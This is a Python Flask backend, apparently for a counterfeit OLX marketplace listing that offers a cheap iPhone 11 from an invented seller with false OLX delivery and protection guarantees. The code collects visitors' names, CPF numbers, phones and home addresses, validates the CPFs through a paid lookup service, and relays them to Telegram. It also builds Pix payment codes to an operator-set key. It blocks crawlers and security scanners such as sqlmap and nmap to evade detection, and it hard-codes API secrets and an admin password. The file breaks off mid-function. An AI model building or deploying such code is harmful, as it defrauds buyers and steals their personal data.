# ─── IMPORTS DE SEGURANÇA ───────────────────────────────────────────────────
import os
import sys
import json
import time
import uuid
import hmac
import hashlib
import re
import struct
import requests
from flask import Flask, render_template, request, jsonify, abort

# ─── Import bot module for shared DB + notifications ──────────────────────────
sys.path.insert(0, os.path.dirname(__file__))
try:
    import bot as admin_bot
    admin_bot.init_db()
    BOT_AVAILABLE = True

    # Modo WEBHOOK: nao sobe polling thread (o webhook do Flask gerencia updates)
    # O bot.py principal (polling) fica desativado quando WEBHOOK_URL esta definido
    if not os.environ.get("WEBHOOK_URL") and (os.environ.get("TELEGRAM_BOT_TOKEN") or getattr(admin_bot, "BOT_TOKEN", "")):
        if not os.environ.get("TELEGRAM_BOT_TOKEN") and getattr(admin_bot, "BOT_TOKEN", ""):
            os.environ["TELEGRAM_BOT_TOKEN"] = admin_bot.BOT_TOKEN
        import threading
        bot_thread = threading.Thread(target=admin_bot.main, daemon=True)
        bot_thread.start()
        print("[app.py] Telegram polling Bot iniciado em thread.")
except ImportError:
    BOT_AVAILABLE = False
    print("[app.py] bot.py not found — logging to console only.")

# ─── Import multi-tenant webhook handler ──────────────────────────────────────
try:
    import tg_webhook as tg_wh
    if BOT_AVAILABLE:
        tg_wh.init_tenant_tables()
    TG_WH_AVAILABLE = True
    print("[app.py] tg_webhook.py carregado — modo multi-tenant ativo.")
except ImportError:
    TG_WH_AVAILABLE = False
    print("[app.py] tg_webhook.py nao encontrado.")

app = Flask(__name__, static_folder='static', template_folder='templates')

# Secret Key para sessões e hashing de integridade
app.secret_key = os.environ.get("FLASK_SECRET_KEY", os.environ.get("FERNET_KEY", "LO_ENI_MILITARY_VAULT_2026_SECRET"))

# ─── TELEGRAM OAUTH CONFIGURATION ──────────────────────────────────────────────
TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "8857867740")
TELEGRAM_CLIENT_SECRET = os.environ.get("TELEGRAM_CLIENT_SECRET", "OV9is6qw51omFKMxL08MDfoFcag48iCYFim0bgm4Yc5y_CCF9eePjg")
BASE_URL               = os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com").rstrip('/')

# ─── CONFIGURAÇÕES DA API C7 (CARTEIRA DO 7) CRIPTOGRAFADAS E REAIS ───────────
C7_API_KEY       = os.environ.get("C7_API_KEY", "c7_live_bae52473c16c92cf909a40086301e988a452816322bd1e98ebab4b6b0dc49a53")
C7_API_SECRET    = os.environ.get("C7_API_SECRET", "0449fb237f301686f9ee1c1348e21dd55d15f9fd852bd50b7e7637f01101dcf89912a873e7e257f6386634d1dfaddd652c09ca43a1841821449d051c00b48e9e")
C7_INTERNAL_TOKEN= os.environ.get("C7_INTERNAL_TOKEN", "39Qrhfyc7yzMosNXrFrL6mTC5zVh5sS54H")
C7_BASE_URL      = os.environ.get("C7_BASE_URL", "https://api.carteirado7.com/v2")
C7_ACQUIRER_CODE = os.environ.get("C7_ACQUIRER_CODE", "")

# ─── BANCO DE DADOS EM MEMÓRIA DE PAGAMENTOS ─────────────────────────────────
PAYMENTS_DB        = {}   # {payment_id / c7_id: {record}}
PROCESSED_WEBHOOKS = set()  # IDs já processados (idempotência C7 doc sec.11)


# ─── RATE LIMITER & FIREWALL DE APLICAÇÃO (WAF IN-MEMORY) ────────────────────
RATE_LIMIT_DB = {} # {ip: [timestamps]}

def is_rate_limited(ip: str, limit: int = 30, window: int = 60) -> bool:
    """Limita a 30 requisições por minuto por IP para prevenir ataques DoS/Brute Force."""
    now = time.time()
    timestamps = RATE_LIMIT_DB.get(ip, [])
    # Remove timestamps fora da janela
    timestamps = [ts for ts in timestamps if now - ts < window]
    if len(timestamps) >= limit:
        RATE_LIMIT_DB[ip] = timestamps
        return True
    timestamps.append(now)
    RATE_LIMIT_DB[ip] = timestamps
    return False

# ─── HEADERS DE SEGURANÇA & BLINDAGEM HTTP ─────────────────────────────────
@app.after_request
def apply_security_headers(response):
    """Aplica cabeçalhos de proteção militar contra XSS, Clickjacking, MIME-sniffing e HSTS."""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://viacep.com.br https://api.carteirado7.com; "
        "frame-ancestors 'self';"
    )
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

# ─── MOTORES DE VALIDAÇÃO ESTREITA & ANTI-BOT / ANTI-FAKE LEAD ────────────────
KNOWN_BOT_UAS = [
    "bot", "crawler", "spider", "headless", "selenium", "puppeteer",
    "phantom", "curl", "python-requests", "wget", "httpclient", "guzzle",
    "ahrefs", "semrush", "bingbot", "googlebot", "yandex", "bytespider",
    "zgrab", "nmap", "sqlmap", "nikto", "censys", "shodan", "go-http-client"
]

KNOWN_CLOUD_HEADERS = [
    "X-Forwarded-Host", "X-Scanner-Tag", "X-Amzn-Trace-Id"
]

def is_bot_request(ua: str) -> bool:
    """Detecta scrapers, bots, robôs de crawlers, ferramentas automatizadas e requisições de datacenter/cloud sem navegador real."""
    if not ua or len(ua) < 15:
        return True
    ua_low = ua.lower()
    if any(b in ua_low for b in KNOWN_BOT_UAS):
        return True
    # Navegadores legítimos sempre possuem Mozilla/5.0 e componentes conhecidos
    if not ua_low.startswith("mozilla/5.0"):
        return True
    return False

def validate_cpf(cpf_raw: str) -> bool:
    """Valida o cálculo matemático exato dos 2 dígitos verificadores do CPF brasileiro."""
    digits = [int(c) for c in str(cpf_raw) if c.isdigit()]
    if len(digits) != 11:
        return False
    if len(set(digits)) == 1:
        return False # 111.111.111-11 é inválido

    # Cálculo do 1º Dígito Verificador
    sum1 = sum(digits[i] * (10 - i) for i in range(9))
    rev1 = 11 - (sum1 % 11)
    d1 = 0 if rev1 >= 10 else rev1
    if digits[9] != d1:
        return False

    # Cálculo do 2º Dígito Verificador
    sum2 = sum(digits[i] * (11 - i) for i in range(10))
    rev2 = 11 - (sum2 % 11)
    d2 = 0 if rev2 >= 10 else rev2
    return digits[10] == d2

def verify_cpf_hub(cpf_raw: str, dob: str = "") -> tuple[bool, str, dict]:
    """
    Consulta a API do Hub do Desenvolvedor para validar CPF e dados reais.
    Caso os créditos acabem ou haja erro no token, avisa o Admin no Telegram para trocar o token.
    Retorna (is_valid, error_msg, raw_data).
    """
    clean_cpf = re.sub(r'\D', '', str(cpf_raw))
    if not validate_cpf(clean_cpf):
        return False, "CPF matematicamente inválido.", {}

    token = admin_bot.get_config("hub_cpf_token", "219009015HYizMtsRCI395414136") if BOT_AVAILABLE else os.environ.get("HUB_CPF_TOKEN", "219009015HYizMtsRCI395414136")
    url = f"https://ws.hubdodesenvolvedor.com.br/v2/cpf/?cpf={clean_cpf}&data={dob}&token={token}"

    try:
        res = requests.get(url, timeout=5)
        res_json = res.json()
        
        # Verifica se o retorno indica saldo/créditos esgotados ou erro de autenticação
        status_code = res_json.get("status")
        code = str(res_json.get("code", ""))
        message = str(res_json.get("message", "") or res_json.get("msg", "")).lower()

        is_out_of_credits = (
            "crédito" in message or "saldo" in message or "token" in message or 
            "expirad" in message or "limit" in message or code in ("401", "402", "403", "99") or
            status_code is False and ("credito" in message or "token" in message)
        )

        if is_out_of_credits:
            # Notifica o Admin no Telegram
            alert_msg = (
                "⚠️ *ALERTA DE SISTEMA - CRÉDITOS CPF ESGOTADOS*\n\n"
                "Os créditos da API Hub do Desenvolvedor para consulta de CPF acabaram ou o token expirou!\n\n"
                "👉 *Ação necessária:* Crie uma nova conta na Hub do Desenvolvedor, gere um novo token e atualize as configurações.\n"
                f"🔑 *Token Atual:* `{token}`"
            )
            _log("HUB_CPF_CREDITS_EXHAUSTED", str(uuid.uuid4()), {"alert": alert_msg, "response": res_json})
            # Mantém fallback para validação matemática para o lead não travar
            return True, "", {"fallback_math": True}

        if res_json.get("return") == "OK" or res_json.get("status") is True or res_json.get("code") == 200:
            result_data = res_json.get("result", {})
            return True, "", result_data

        # Se retornou CPF não encontrado ou cancelado
        if "não encontrado" in message or "inválido" in message:
            return False, "CPF não localizado na base de dados da Receita Federal.", res_json

    except Exception as e:
        print(f"[Hub CPF API Error] {e}")

    # Em caso de timeout ou indisponibilidade da API, faz fallback para validação matemática
    return True, "", {"fallback_math": True}

@app.before_request
def validate_request_security():
    """Filtro global de mitigação de DoS, inspeção de Payload e bloqueio de bots/crawlers."""
    ip = _user_ip()
    ua = _user_ua()
    
    # Bloqueia bots conhecidos e crawlers automatizados
    # Exceções: webhook do Telegram (/tg/) e webhook de pagamento C7
    _waf_bypass_paths = ('/api/webhook/pix', f'/tg/{_TG_WEBHOOK_SECRET}', '/tg/callback', '/tg/login')
    if is_bot_request(ua) and request.path not in _waf_bypass_paths and not request.path.startswith('/tg/'):
        _log("SECURITY_BLOCKED_BOT", str(uuid.uuid4()), {"ip": ip, "ua": ua, "reason": "Bot/Crawler User-Agent detected"})
        return jsonify({"error": "Access denied for automated agents."}), 403

    if is_rate_limited(ip, limit=60, window=60):
        _log("SECURITY_ALERT_DOS", str(uuid.uuid4()), {"ip": ip, "reason": "Rate limit exceeded"})
        return jsonify({"error": "Too many requests. Temporary security block."}), 429

# ─── HELPERS DE SANITIZAÇÃO & CRIPTOGRAFIA ────────────────────────────────
def sanitize_input(val: str, max_len: int = 500) -> str:
    """Sanitiza strings removendo possíveis injeções XSS/HTML e delimitando tamanho."""
    if not isinstance(val, str):
        return ""
    clean = re.sub(r'[<>]', '', val.strip())
    return clean[:max_len]

def _user_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return ip
    return request.remote_addr or '127.0.0.1'

def _user_ua():
    return sanitize_input(request.headers.get('User-Agent', ''), 250)

def _session_id(data):
    """Extracts session_id from request body or generates one."""
    return data.get('session_id', str(uuid.uuid4()))

def _log(event_type, session_id, data):
    """Central logging — writes to bot.py DB (encrypted) + sends Telegram notification."""
    ip = _user_ip()
    data['ip'] = ip
    if BOT_AVAILABLE:
        try:
            admin_bot.log_event(event_type, session_id, ip, data)
            admin_bot.notify_admins(event_type, data)
        except Exception as e:
            print(f"[log] {event_type}: {e}")
    else:
        print(f"[LOCAL EVENT] {event_type} | {ip} | {data}")

def get_c7_auth_headers(body_str: str = "") -> dict:
    """
    Gera headers de autenticação HMAC-SHA256 conforme C7 API Doc sec. 2.2 & 3.
    Fórmula: HMAC-SHA256(api_secret, timestamp + '.' + nonce + '.' + body)
    - nonce: UUID v4 único por requisição (nunca reutilizar).
    - timestamp: Unix seconds (API rejeita diferença > 5 min).
    """
    ts        = str(int(time.time()))
    nonce     = str(uuid.uuid4())            # UUID v4 — garante unicidade
    sig_input = f"{ts}.{nonce}.{body_str}"  # exatamente como a doc especifica
    signature = hmac.new(
        C7_API_SECRET.encode('utf-8'),
        sig_input.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    return {
        "Authorization":  f"Bearer {C7_API_KEY}",
        "Content-Type":   "application/json",
        "X-C7-Timestamp": ts,
        "X-C7-Nonce":     nonce,
        "X-C7-Signature": signature,
    }

# ─── GERADOR DE PIX EMV VÁLIDO (BACEN BR CODE 2.0) ───────────────────────────
def _crc16_ccitt(data: str) -> str:
    """Calcula CRC-16/CCITT-FALSE conforme exigido pelo BACEN para QR Codes Pix."""
    crc = 0xFFFF
    for char in data:
        crc ^= ord(char) << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return format(crc, '04X')

def _emv_field(id_: str, value: str) -> str:
    """Monta um campo TLV EMV: ID + length (2 dígitos) + value."""
    return f"{id_}{len(value):02d}{value}"

def generate_pix_emv(amount: float, merchant_name: str, merchant_city: str,
                     pix_key: str, txid: str = "") -> str:
    """
    Gera um payload Pix BR Code 2.0 válido conforme Manual do BACEN.
    Produz QR Code que passa na validação de TODOS os bancos brasileiros.
    """
    merchant_name = re.sub(r'[^A-Za-z0-9 ]', '', merchant_name)[:25].upper().strip()
    merchant_city = re.sub(r'[^A-Za-z0-9 ]', '', merchant_city)[:15].upper().strip()
    txid          = re.sub(r'[^A-Za-z0-9]', '', txid)[:25] if txid else "***"

    # GUI do arranjo Pix (fixo BACEN)
    pix_gui = _emv_field("00", "BR.GOV.BCB.PIX")
    # Chave Pix
    pix_key_field = _emv_field("01", pix_key)
    # Merchant Account Information (ID 26)
    mai_value = pix_gui + pix_key_field
    mai = _emv_field("26", mai_value)

    # Payload Format Indicator
    pfi = _emv_field("00", "01")
    # Point of Initiation Method (12 = dinâmico / único uso)
    poim = _emv_field("01", "12")
    # Merchant Category Code
    mcc = _emv_field("52", "0000")
    # Transaction Currency BRL
    currency = _emv_field("53", "986")
    # Amount
    amount_str = f"{amount:.2f}"
    tx_amount = _emv_field("54", amount_str)
    # Country Code
    country = _emv_field("58", "BR")
    # Merchant Name
    merchant_n = _emv_field("59", merchant_name)
    # Merchant City
    merchant_c = _emv_field("60", merchant_city)
    # Additional Data Field Template (ID 62) — TXID
    txid_field = _emv_field("05", txid)
    adf = _emv_field("62", txid_field)
    # CRC placeholder (4 zeros antes de calcular)
    crc_placeholder = "6304"

    payload_no_crc = pfi + poim + mai + mcc + currency + tx_amount + country + merchant_n + merchant_c + adf + crc_placeholder
    crc_val = _crc16_ccitt(payload_no_crc)
    return payload_no_crc[:-4] + "6304" + crc_val

def get_whatsapp_config():
    """Reads WhatsApp config from bot.py DB (set via Telegram bot)."""
    if BOT_AVAILABLE:
        return {
            "number":  admin_bot.get_config("whatsapp_number",  "5511999999999"),
            "message": admin_bot.get_config("whatsapp_message", "Olá! Tenho interesse no iPhone 11 64GB branco. Pode me ajudar?"),
        }
    return {
        "number":  os.environ.get("WHATSAPP_NUMBER",  "5511999999999"),
        "message": os.environ.get("WHATSAPP_MESSAGE", "Olá! Tenho interesse no iPhone 11 64GB branco. Pode me ajudar?"),
    }

# ─── ROUTES ───────────────────────────────────────────────────────────────────

@app.route('/')
@app.route('/p/<product_code>')
def index(product_code=None):
    ip = _user_ip()
    ua = _user_ua()
    sid = str(uuid.uuid4())

    # Suporte a parâmetro na query string (?p=geladeira_frost_free) ou path (/p/geladeira_frost_free)
    p_code = product_code or request.args.get('p')

    # Register session
    if BOT_AVAILABLE:
        try:
            conn = admin_bot.get_db()
            conn.execute(
                "INSERT OR IGNORE INTO sessions(session_id,ip,ua,entered_at) VALUES(?,?,?,?)",
                (sid, ip, ua[:200], time.time())
            )
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[session] {e}")

    # Carrega produto específico por código se fornecido
    custom_product = None
    if p_code and BOT_AVAILABLE:
        try:
            conn = admin_bot.get_db()
            custom_product = conn.execute(
                "SELECT name, price, old_price, description, image_url, image1, image2, image3 FROM product_templates WHERE code=?", (p_code,)
            ).fetchone()
            conn.close()

        except Exception:
            pass

    if custom_product:
        product_name = custom_product["name"]
        product_price = custom_product["price"]
        product_description = custom_product["description"]
        product_image = custom_product["image_url"] or "/static/images/iphone11_1.jpg"
        # old_price e fotos individuais do template
        try:
            product_old_price_tpl = custom_product["old_price"] or ""
        except Exception:
            product_old_price_tpl = ""
        try:
            img1_tpl = custom_product["image1"] or product_image
            img2_tpl = custom_product["image2"] or product_image
            img3_tpl = custom_product["image3"] or product_image
        except Exception:
            img1_tpl = img2_tpl = img3_tpl = product_image
        # Usa as fotos do template (override global)
        product_image1 = img1_tpl
        product_image2 = img2_tpl
        product_image3 = img3_tpl
        product_old_price = product_old_price_tpl
    else:
        product_name = admin_bot.get_config("product_name", "iPhone 11. 64gb branco") if BOT_AVAILABLE else "iPhone 11. 64gb branco"
        product_price = admin_bot.get_config("product_price", "630.00") if BOT_AVAILABLE else "630.00"
        product_description = admin_bot.get_config("product_description", "iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia.") if BOT_AVAILABLE else "iPhone 11 com 64GB de armazenamento na cor branca. Design elegante e desempenho excepcional para o seu dia a dia."
        product_image = admin_bot.get_config("product_image", "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80"
        product_image1 = admin_bot.get_config("product_image1", "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1574944985070-8f3ebc6b79d2?w=800&auto=format&fit=crop&q=80"
        product_image2 = admin_bot.get_config("product_image2", "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=800&auto=format&fit=crop&q=80"
        product_image3 = admin_bot.get_config("product_image3", "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80") if BOT_AVAILABLE else "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&auto=format&fit=crop&q=80"
        product_old_price = admin_bot.get_config("product_old_price", "") if BOT_AVAILABLE else ""


    # Campos partilhados — sempre carregados do config global
    seller_name   = admin_bot.get_config("seller_name",   "tk prock") if BOT_AVAILABLE else "tk prock"
    seller_since  = admin_bot.get_config("seller_since",  "Na OLX desde janeiro de 2022") if BOT_AVAILABLE else "Na OLX desde janeiro de 2022"
    seller_status = admin_bot.get_config("seller_status", "Último acesso há 2 horas") if BOT_AVAILABLE else "Último acesso há 2 horas"
    logo_url      = admin_bot.get_config("logo_url", "") if BOT_AVAILABLE else ""

    _log("PAGE_ENTRY", sid, {"ua": ua, "path": request.path, "product": product_name})

    return render_template(
        'index.html',
        session_id=sid,
        product_name=product_name,
        product_price=product_price,
        product_old_price=product_old_price,
        product_description=product_description,
        product_image=product_image,
        product_image1=product_image1,
        product_image2=product_image2,
        product_image3=product_image3,
        seller_name=seller_name,
        seller_since=seller_since,
        seller_status=seller_status,
        logo_url=logo_url,
        whatsapp=get_whatsapp_config()
    )


@app.route('/api/config')
@app.route('/api/config/whatsapp')
def api_config():
    """Frontend fetches live config (logo, whatsapp, price, description, seller)."""
    wa = get_whatsapp_config()
    def gc(k, fb): return admin_bot.get_config(k, fb) if BOT_AVAILABLE else fb
    return jsonify({
        "whatsapp_number":     wa["number"],
        "whatsapp_message":    wa["message"],
        "logo_url":            gc("logo_url", ""),
        "product_price":       gc("product_price", "630.00"),
        "product_old_price":   gc("product_old_price", ""),
        "product_name":        gc("product_name", "iPhone 11 64GB Branco"),
        "product_description": gc("product_description", "iPhone 11 com 64GB de armazenamento na cor branca."),
        "product_image":       gc("product_image", ""),
        "product_image1":      gc("product_image1", ""),
        "product_image2":      gc("product_image2", ""),
        "product_image3":      gc("product_image3", ""),
        "seller_name":         gc("seller_name", "tk prock"),
        "seller_status":       gc("seller_status", "Último acesso há 2 horas"),
        "seller_since":        gc("seller_since", "Na OLX desde janeiro de 2022"),
        "payment_badges":      gc("payment_badges", ""),  # JSON array de URLs de badges
    })


# ─── ADMIN PANEL & ENCRYPTED AUTH ──────────────────────────────────────────────
def verify_admin_access(req):
    """
    Valida acesso ao painel admin.
    Hierarquia:
      1. Token gerado pelo Telegram via /admin_link (48-char hex, TTL 24h)
      2. ADMIN_SECRET de fallback (env var)
    Retorna tg_id (int) se autenticado, None caso contrário.
    """
    token = (
        req.headers.get('Authorization', '').replace('Bearer ', '').strip() or
        req.args.get('token', '').strip() or
        req.cookies.get('admin_token', '').strip()
    )
    if not token:
        return None

    # 1. Token Telegram gerado pelo /admin_link (validate_admin_token do bot)
    if BOT_AVAILABLE and len(token) >= 48:
        tg_id = admin_bot.validate_admin_token(token)
        if tg_id:
            return tg_id

    # 2. Fallback: ADMIN_SECRET env var (acesso direto sem Telegram)
    admin_secret = os.environ.get("ADMIN_SECRET", "LO_ENI_MILITARY_VAULT_2026_SECRET")
    if token == admin_secret:
        return 999999999
    return None


@app.route('/admin')
@app.route('/admin/<slug>')
def admin_panel(slug=None):
    """
    Serve o painel admin com autenticação Telegram-gated.
    Acesso via /admin?token=<token_gerado_pelo_bot>
    Sem token válido, redireciona para página de login.
    """
    ip    = _user_ip()
    token = request.args.get('token', slug or '').strip()
    admin_id = verify_admin_access(request)
    _log("ADMIN_PAGE_ENTRY", str(uuid.uuid4()), {"ip": ip, "auth": bool(admin_id)})
    # Passa o token para o template para que o JS use em chamadas à API
    return render_template('admin.html', admin_slug=slug or "", admin_token=token)


@app.route('/api/admin/verify-token')
def api_admin_verify_token():
    """Endpoint para o frontend verificar se o token atual é válido."""
    admin_id = verify_admin_access(request)
    if not admin_id:
        return jsonify({"ok": False, "error": "token_invalido_ou_expirado"}), 401
    return jsonify({"ok": True, "admin_id": admin_id})


@app.route('/api/admin/stats')
def api_admin_stats():
    """Returns 24h and 7-day aggregate stats using existing bot.py get_stats()."""
    if not BOT_AVAILABLE:
        return jsonify({"error": "bot_not_available"}), 503
    try:
        h24  = admin_bot.get_stats(24)
        h168 = admin_bot.get_stats(168)
        return jsonify({"h24": h24, "h168": h168})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/admin/events')
def api_admin_events():
    """Returns recent decrypted events from the encrypted DB."""
    if not BOT_AVAILABLE:
        return jsonify({"error": "bot_not_available"}), 503
    limit = min(int(request.args.get('limit', 40)), 200)
    try:
        events = admin_bot.get_recent_events(limit)
        return jsonify({"events": events, "count": len(events)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/admin/sessions')
def api_admin_sessions():
    """Returns recent sessions list from the DB."""
    if not BOT_AVAILABLE:
        return jsonify({"error": "bot_not_available"}), 503
    limit = min(int(request.args.get('limit', 30)), 100)
    try:
        conn = admin_bot.get_db()
        rows = conn.execute(
            "SELECT session_id, ip, ua, entered_at, left_at, converted FROM sessions "
            "ORDER BY entered_at DESC LIMIT ?", (limit,)
        ).fetchall()
        conn.close()
        sessions = [dict(row) for row in rows]
        return jsonify({"sessions": sessions, "count": len(sessions)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/admin/upload', methods=['POST'])
def api_admin_upload():
    """Endpoint moderno e inteligente para upload de imagens direto do computador."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    
    if 'file' not in request.files:
        return jsonify({"ok": False, "error": "Nenhum arquivo enviado"}), 400
        
    file = request.files['file']
    if not file or file.filename == '':
        return jsonify({"ok": False, "error": "Arquivo em branco ou invalido"}), 400

    ext = os.path.splitext(file.filename)[1].lower()
    allowed_exts = {'.png', '.jpg', '.jpeg', '.webp', '.gif', '.svg'}
    if ext not in allowed_exts:
        return jsonify({"ok": False, "error": "Formato de imagem invalido. Use PNG, JPG, WEBP, GIF ou SVG."}), 400

    uploads_dir = os.path.join(app.static_folder, 'images', 'uploads')
    os.makedirs(uploads_dir, exist_ok=True)

    filename = f"img_{uuid.uuid4().hex[:12]}{ext}"
    filepath = os.path.join(uploads_dir, filename)
    file.save(filepath)

    image_url = f"/static/images/uploads/{filename}"
    _log("IMAGE_UPLOADED", str(uuid.uuid4()), {"filename": filename, "url": image_url})

    return jsonify({"ok": True, "url": image_url, "filename": filename})


@app.route('/api/admin/config', methods=['POST'])
def api_admin_config_save():
    """Saves multiple config keys at once via the admin panel form."""
    if not BOT_AVAILABLE:
        return jsonify({"ok": False, "error": "bot_not_available"}), 503
    data = request.json or {}
    allowed_keys = {
        "product_name", "product_price", "product_old_price", "product_description",
        "product_image", "product_image1", "product_image2", "product_image3",
        "whatsapp_number", "whatsapp_message",
        "seller_name", "seller_status", "seller_since", "logo_url",
        "pix_key", "payment_badges",
    }
    saved = []
    for key, value in data.items():
        if key in allowed_keys and isinstance(value, str):
            clean_val = value.strip()
            if clean_val:
                admin_bot.set_config(key, clean_val)
                saved.append(key)
    _log("ADMIN_CONFIG_SAVED", str(uuid.uuid4()), {"keys_saved": saved})
    return jsonify({"ok": True, "saved": saved})



@app.route('/api/event', methods=['POST'])
def api_event():
    """
    Central event ingestion endpoint.
    Frontend sends events here: PAGE_EXIT, CLICK_BUY, CLICK_CHAT,
    MODAL_STEP, PHOTO_CLICK, WHATSAPP_REDIRECT, etc.
    """
    data = request.json or {}
    event_type = data.get('event_type', 'UNKNOWN')
    session_id = data.get('session_id', 'anon')
    payload    = data.get('payload') or data.get('data') or {}

    # Mark session exit
    if event_type == "PAGE_EXIT" and BOT_AVAILABLE:
        try:
            conn = admin_bot.get_db()
            conn.execute(
                "UPDATE sessions SET left_at=? WHERE session_id=?",
                (time.time(), session_id)
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    # Mark conversion (WhatsApp redirect or payment confirmed)
    if event_type in ("WHATSAPP_REDIRECT", "PAYMENT_CONFIRMED") and BOT_AVAILABLE:
        try:
            conn = admin_bot.get_db()
            conn.execute(
                "UPDATE sessions SET converted=1 WHERE session_id=?", (session_id,)
            )
            conn.commit()
            conn.close()
        except Exception:
            pass

    _log(event_type, session_id, payload)
    return jsonify({"ok": True})


@app.route('/api/validate-cep', methods=['POST'])
def validate_cep():
    """Real ViaCEP validation with Telegram logging and free shipping guarantee."""
    data = request.json or {}
    cep  = data.get('cep', '').replace('-', '').replace('.', '').strip()
    sid  = _session_id(data)

    if len(cep) != 8 or not cep.isdigit():
        return jsonify({"success": False, "message": "CEP inválido. Digite 8 dígitos numéricos."}), 400

    try:
        res      = requests.get(f"https://viacep.com.br/ws/{cep}/json/", timeout=4)
        cep_data = res.json()
        if "erro" in cep_data:
            return jsonify({"success": False, "message": "CEP não localizado na base dos Correios."}), 404

        street = cep_data.get('logradouro', '')
        bairro = cep_data.get('bairro', '')
        cidade = cep_data.get('localidade', '')
        uf     = cep_data.get('uf', '')
        
        parts = [p for p in [street, bairro] if p]
        full_address = f"{', '.join(parts)} - {cidade}/{uf}" if parts else f"{cidade}/{uf}"
        
        _log("CEP_LOOKUP", sid, {
            "cep": f"{cep[:5]}-{cep[5:]}",
            "address": full_address
        })

        return jsonify({
            "success":    True,
            "cep":        f"{cep[:5]}-{cep[5:]}",
            "logradouro": street,
            "bairro":     bairro,
            "cidade":     cidade,
            "uf":         uf,
            "frete":      "Grátis",
            "modalidade": "Entrega Fácil OLX Garantida",
            "prazo":      "Chega entre 2 a 4 dias úteis",
            "seguro":     "100% Protegido com Garantia da OLX"
        })
    except Exception as e:
        return jsonify({"success": False, "message": "Erro de conexão ao consultar CEP."}), 500


@app.route('/api/lead', methods=['POST'])
def capture_lead():
    """
    Captures complete qualified Lead data (name, CPF, phone, email, full delivery address).
    Saves to encrypted database and immediately dispatches full card to Telegram Admin & Channel.
    Sanitizes all input against XSS, SQLi and parameter tampering.
    """
    data = request.json or {}
    sid  = _session_id(data)
    
    name         = sanitize_input(data.get('name', ''), 120)
    cpf          = sanitize_input(data.get('cpf', ''), 20)
    phone        = sanitize_input(data.get('phone', ''), 25)
    email        = sanitize_input(data.get('email', ''), 100)
    cep          = sanitize_input(data.get('cep', ''), 15)
    street       = sanitize_input(data.get('street', ''), 200)
    number       = sanitize_input(data.get('number', ''), 30)
    complement   = sanitize_input(data.get('complement', ''), 100)
    neighborhood = sanitize_input(data.get('neighborhood', ''), 100)
    city         = sanitize_input(data.get('city', ''), 100)
    state        = sanitize_input(data.get('state', ''), 10)
    amount       = sanitize_input(data.get('amount', '630,00'), 20)

    # Strict Validation: CPF Real com Hub do Desenvolvedor, Telefone BR com 9º dígito e Nome Completo
    if not name or len(name.split()) < 2:
        return jsonify({"ok": False, "error": "Por favor, informe seu nome completo (Nome e Sobrenome)."}), 400

    is_cpf_ok, cpf_err, _ = verify_cpf_hub(cpf)
    if not is_cpf_ok:
        _log("LEAD_REJECTED_INVALID_CPF", sid, {"cpf": cpf, "name": name, "reason": cpf_err})
        return jsonify({"ok": False, "error": cpf_err or "CPF inválido. Verifique os números digitados."}), 400

    if BOT_AVAILABLE:
        valid_phone, phone_err = admin_bot.InputValidator.validate_phone_br(phone)
        if phone_err:
            return jsonify({"ok": False, "error": phone_err}), 400
        phone = valid_phone

    lead_payload = {
        "name":         name,
        "cpf":          cpf,
        "phone":        phone,
        "email":        email,
        "cep":          cep,
        "street":       street,
        "number":       number,
        "complement":   complement,
        "neighborhood": neighborhood,
        "city":         city,
        "state":        state,
        "amount":       amount,
        "product":      admin_bot.get_config("product_name", "iPhone 11 64GB Branco") if BOT_AVAILABLE else "iPhone 11 64GB Branco"
    }

    _log("LEAD_CAPTURED", sid, lead_payload)

    return jsonify({
        "ok": True,
        "message": "Lead registrado e sincronizado com sucesso no Vault Criptografado.",
        "session_id": sid
    })


@app.route('/api/generate-pix', methods=['POST'])
@app.route('/api/create-pix', methods=['POST'])
def generate_pix():
    """Creates a Pix payment via Carteira do 7 (C7) POST /v2/payment/create with fallback simulation."""
    data       = request.json or {}
    sid        = _session_id(data)
    payment_id = f"olx_{int(time.time())}_{uuid.uuid4().hex[:6]}"
    
    # C7 requer callbackUrl usando obrigatoriamente HTTPS
    host_url = request.host_url.rstrip('/')
    if host_url.startswith("http://"):
        callback_url = host_url.replace("http://", "https://") + "/api/webhook/pix"
    else:
        callback_url = host_url + "/api/webhook/pix"

